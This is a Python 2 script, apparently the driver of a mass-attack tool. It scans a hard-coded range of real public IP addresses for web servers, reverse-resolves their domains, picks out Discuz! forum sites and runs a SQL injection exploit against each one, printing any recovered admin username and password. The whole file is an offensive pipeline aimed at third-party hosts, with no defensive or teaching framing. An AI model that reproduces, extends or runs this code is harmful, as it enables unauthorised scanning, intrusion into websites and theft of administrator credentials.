#coding=utf-8
import requests
import json
import urllib
import sys
import os
import socket
import time
import re
from bs4 import BeautifulSoup
from discuz_feature import matches
from util import Util
from ip_reverse import IPReverse
from scanner import Scanner
from discuz_detector import DiscuzDetector
from discuz_attacker import DiscuzAttacker

'''
工作类
负责调用模块完成业务逻辑
'''
class Worker():
	def __init__(self,ip1,ip2):
		self.startip = ip1
		self.endip = ip2
	def doJob(self):
		myscanner = Scanner()
		ipreverse = IPReverse()
		domain_list = []
		tmp_list = []
		discuz_res = []
		ip_list = myscanner.WebScanner(self.startip,self.endip) #获取IP列表
		for x in ip_list:
			tmp_list = ipreverse.getDomainsList(x)
			if tmp_list == None:
				continue
			domain_list = domain_list + tmp_list   #获取域名列表
		for x in domain_list:
			if not x:
				continue
			for i in x:
				print i
				discuzdetector = DiscuzDetector(i)
				if discuzdetector.get_result()[0]:
				    discuz_res.append(i)
				else:
					continue
		return discuz_res


'''
Discuz攻击程序
使用漏洞为：
recommend.php
用户推荐功能sql注入
'''
class DiscuzAttackProcess():
	def __init__(self):
		self.discuz_attaker = DiscuzAttacker()
	def exploit(self,discuz_list):
		for x in discuz_list:
			url = "http://%s" % x
			print '-'*60
			print 'Target host is %s' % x
			res = self.discuz_attaker.faq_sqlin_exploit(x)
			if not res:
				print u'Exploit Failed!'
			else:
				print 'Exploit success!'
				print 'Username:%s\nPassword:%s' % (res[0],res[1])
		return ''

'''
实现的业务逻辑：
1、实现主机端口扫描（主要扫描80），获取开放80的主机列表（IP列表）
2、从IP列表中反查出绑定在每个item上的域名，获取域名列表
3、从域名列表中识别出使用dedecms的域名
4、开始漏洞攻击探测，识别出存在漏洞的主机
'''
if __name__ == '__main__':
	begin = time.time()
	discuz_res = []
	util = Util()
	print 'Job starting....\nPlease wait....'
	#myworker = Worker('219.235.5.52','219.235.5.54')
	#myworker = Worker('121.14.59.91','121.14.59.91')
	# myworker = Worker('218.66.104.103','218.66.104.103')
	myworker = Worker('220.183.67.20','220.203.188.13')
	# myworker = Worker('202.98.226.144','202.98.226.151')
	discuz_res = myworker.doJob()
	current = time.time() - begin
	print 'Cost :%s s' % str(current)
	if discuz_res == []:
		print u'No such web-app'
	else:
		print 'Find Discuz! The results are displayed below:'
		util.list_display(discuz_res)

	#攻击程序（可以自行添加）
	discuz_attacker = DiscuzAttackProcess()
	discuz_attacker.exploit(discuz_res)






	 
